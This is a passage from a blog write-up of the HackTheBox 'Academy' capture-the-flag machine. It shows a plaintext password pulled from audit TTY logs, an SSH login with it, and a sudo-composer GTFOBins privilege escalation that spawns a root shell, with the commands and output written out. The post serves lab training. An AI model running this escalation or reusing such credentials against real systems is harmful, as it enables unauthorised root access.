9. 08/12/2020 02:33:26 97 0 ? 1 bash <span class="s2">"ca"</span>,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span class="s2">"cat au"</span>,&lt;tab&gt;,<span class="s2">"| grep data="</span>,&lt;ret&gt;,<span class="s2">"cat au"</span>,&lt;tab&gt;,<span class="s2">"| cut -f11 -d</span><span class="se">\"</span><span class="s2"> </span><span class="se">\"</span><span class="s2">"</span>,&lt;ret&gt;,&lt;up&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;right&gt;,&lt;right&gt;,<span class="s2">"grep data= | "</span>,&lt;ret&gt;,&lt;up&gt;,<span class="s2">" &gt; /tmp/data.txt"</span>,&lt;ret&gt;,<span class="s2">"id"</span>,&lt;ret&gt;,<span class="s2">"cd /tmp"</span>,&lt;ret&gt;,<span class="s2">"ls"</span>,&lt;ret&gt;,<span class="s2">"nano d"</span>,&lt;tab&gt;,&lt;ret&gt;,<span class="s2">"cat d"</span>,&lt;tab&gt;,<span class="s2">" | xx"</span>,&lt;tab&gt;,<span class="s2">"-r -p"</span>,&lt;ret&gt;,<span class="s2">"ma"</span>,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span class="s2">"nano d"</span>,&lt;tab&gt;,&lt;ret&gt;,<span class="s2">"cat dat"</span>,&lt;tab&gt;,<span class="s2">" | xxd -r p"</span>,&lt;ret&gt;,&lt;up&gt;,&lt;left&gt;,<span class="s2">"-"</span>,&lt;ret&gt;,<span class="s2">"cat /var/log/au"</span>,&lt;tab&gt;,<span class="s2">"t"</span>,&lt;tab&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span class="s2">"d"</span>,&lt;tab&gt;,<span class="s2">"aud"</span>,&lt;tab&gt;,<span class="s2">"| grep data="</span>,&lt;ret&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;down&gt;,&lt;ret&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;ret&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;ret&gt;,<span class="s2">"exit"</span>,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span class="s2">"history"</span>,&lt;ret&gt;,<span class="s2">"exit"</span>,&lt;ret&gt;
10. 08/12/2020 02:33:26 98 0 ? 1 sh <span class="s2">"exit"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
11. 08/12/2020 02:33:30 107 0 ? 1 sh <span class="s2">"/bin/bash -i"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
12. 08/12/2020 02:33:36 108 0 ? 1 bash <span class="s2">"istory"</span>,&lt;ret&gt;,<span class="s2">"history"</span>,&lt;ret&gt;,<span class="s2">"exit"</span>,&lt;ret&gt;
13. 08/12/2020 02:33:36 109 0 ? 1 sh <span class="s2">"exit"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>Apparently, Whatever we did manually to discover <code class="language-plaintext highlighter-rouge">mrb3n_Ac@d3my!</code> password can also be done using this tool.</p><h2 id="elevating-mrb3n---root">Elevating mrb3n -&gt; root</h2><p>SSH to mrb3n :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy
→ ssh mrb3n@10.10.10.215
mrb3n@10.10.10.215<span class="s1">'s password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 08 Nov 2020 08:50:38 PM UTC

  System load:             0.65
  Usage of /:              44.4% of 15.68GB
  Memory usage:            23%
  Swap usage:              0%
  Processes:               201
  Users logged in:         1
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:b323


0 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
</span></pre></table></code></div></div><h3 id="enumeration-2">Enumeration</h3><p>Exploring privileges:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>mrb3n@academy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mrb3n on academy:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User mrb3n may run the following commands on academy:
    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/composer
</pre></table></code></div></div><p>Turns our mrb3n user can run composer with sudo</p><h3 id="root-shell">root shell</h3><p>Referring <a href="https://gtfobins.github.io/gtfobins/composer/"><strong>GTFO</strong></a> to get root shell:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>mrb3n@academy:~<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
mrb3n@academy:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'{"scripts":{"x":"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"}}'</span> <span class="o">&gt;</span><span class="nv">$TF</span>/composer.json
mrb3n@academy:~<span class="nv">$ </span><span class="nb">sudo </span>composer <span class="nt">--working-dir</span><span class="o">=</span><span class="nv">$TF</span> run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library <span class="s1">'mysqli.so'</span> <span class="o">(</span>tried: /usr/lib/php/20190902/mysqli.so <span class="o">(</span>/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats<span class="o">)</span>, /usr/lib/php/20190902/mysqli.so.so <span class="o">(</span>/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory<span class="o">))</span> <span class="k">in </span>Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library <span class="s1">'pdo_mysql.so'</span> <span class="o">(</span>tried: /usr/lib/php/20190902/pdo_mysql.so <span class="o">(</span>/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator<span class="o">)</span>, /usr/lib/php/20190902/pdo_mysql.so.so <span class="o">(</span>/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory<span class="o">))</span> <span class="k">in </span>Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root <span class="k">for </span>details
<span class="o">&gt;</span> /bin/sh <span class="nt">-i</span> 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>

root@academy:~# <span class="nb">cat </span>academy.txt
██╗  ██╗████████╗██████╗      █████╗  ██████╗ █████╗ ██████╗ ███████╗███╗   ███╗██╗   ██╗
██║  ██║╚══██╔══╝██╔══██╗    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝████╗ ████║╚██╗ ██╔╝
███████║   ██║   ██████╔╝    ███████║██║     ███████║██║  ██║█████╗  ██╔████╔██║ ╚████╔╝
██╔══██║   ██║   ██╔══██╗    ██╔══██║██║     ██╔══██║██║  ██║██╔══╝  ██║╚██╔╝██║  ╚██╔╝
██║  ██║   ██║   ██████╔╝    ██║  ██║╚██████╗██║  ██║██████╔╝███████╗██║ ╚═╝ ██║   ██║
╚═╝  ╚═╝   ╚═╝   ╚═════╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝   ╚═╝

We<span class="s1">'ve been hard at work.

Check out our brand new training platform, Hack the Box Academy!

https://academy.hackthebox.eu/
</span></pre></table></code></div></div><p>Grabbing root.txt:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># bash</span>
root@academy:/tmp/tmp.2eB1VYtdHa# <span class="nb">cd</span> ~
root@academy:~# <span class="nb">cat </span>root.txt
c7baa2003770d4<span class="k">******************</span>

</pre></table></code></div></div><p>And we pwned the Box !</p><p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux-machines/'>Linux Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/academy/" class="post-tag no-text-decoration" >academy</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/laravel/" class="post-tag no-text-decoration" >laravel</a> <a href="/tags/vhost/" class="post-tag no-text-decoration" >vhost</a> <a href="/tags/ffuf/" class="post-tag no-text-decoration" >ffuf</a> <a href="/tags/cve-2018-15133/" class="post-tag no-text-decoration" >CVE-2018-15133</a> <a href="/tags/unserialize/" class="post-tag no-text-decoration" >unserialize</a> <a href="/tags/deserialization/" class="post-tag no-text-decoration" >deserialization</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >metasploit</a> <a href="/tags/password-reuse/" class="post-tag no-text-decoration" >password-reuse</a> <a href="/tags/adm/" class="post-tag no-text-decoration" >adm</a> <a href="/tags/hex/" class="post-tag no-text-decoration" >hex</a> <a href="/tags/logs/" class="post-tag no-text-decoration" >logs</a> <a href="/tags/audit/" class="post-tag no-text-decoration" >audit</a> <a href="/tags/aureport/" class="post-tag no-text-decoration" >aureport</a> <a href="/tags/gtfobins/" class="post-tag no-text-decoration" >gtfobins</a> <a href="/tags/composer/" class="post-tag no-text-decoration" >composer</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox — Academy Writeup - b3t4m3&url=http://localhost:4000/posts/Academy-HTB/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox — Academy Writeup - b3t4m3&u=http://localhost:4000/posts/Academy-HTB/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox — Academy Writeup - b3t4m3&url=http://localhost:4000/posts/Academy-HTB/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PassageHTB/">HackTheBox — Passage Writeup</a></li><li><a href="/posts/Doctor-HTB/">HackTheBox — Doctor Writeup</a></li><li><a href="/posts/Omni-HTB/">HackTheBox — Omni Writeup</a></li><li><a href="/posts/OpenKeys-HTB/">HackTheBox — OpenKeyS Writeup</a></li><li><a href="/posts/SneakyMailer-HTB/">HackTheBox — SneakyMailer Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Tabby-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 12, 2020 <i class="unloaded">2020-11-12T12:20:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Tabby Writeup</h3><div class="text-muted small"><p> Tabby was a user friendly easy level box put together with interesting attack vectors. We start off with discovering Local File Inclusion (LFI) in a website and leverage it to expose credentials...</p></div></div></a></div><div class="card"> <a href="/posts/LaboratoryHTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Apr 23, 2021 <i class="unloaded">2021-04-23T14:40:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Laboratory Writeup</h3><div class="text-muted small"><p> Laboratory starts off with discovering an vulnerable GitLab instance running on the box. We’ll refer an HackerOne report to exploit a CVE associated with it to get Arbitrary file read vulnerabil...</p></div></div></a></div><div class="card"> <a href="/posts/PassageHTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Mar 10, 2021 <i class="unloaded">2021-03-10T12:15:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Passage Writeup</h3><div class="text-muted small"><p> Passage starts off with web enumeration where we discover the website running on a vulnerable instance of CuteNews CMS and exploit it through bypassing Avatar Image Upload functionality to drop ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Doctor-HTB/" class="btn btn-outline-primary"><p>HackTheBox — Doctor Writeup</p></a> <a href="/posts/PassageHTB/" class="btn btn-outline-primary"><p>HackTheBox — Passage Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//coldfx.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/Academy-HTB/'; this.page.identifier = '/posts/Academy-HTB/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ColdFusionX" data-description="Your Support means the World to me !" data-message="Thank you for visiting. Hope you liked my Blog!" data-color="#5F7FFF" data-position="" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="">Carlos Sequeira</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.eu/badge/163155"></script></p></div><div class="footer-right"><p class="mb-0"><h4>Realm of Knowledge</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
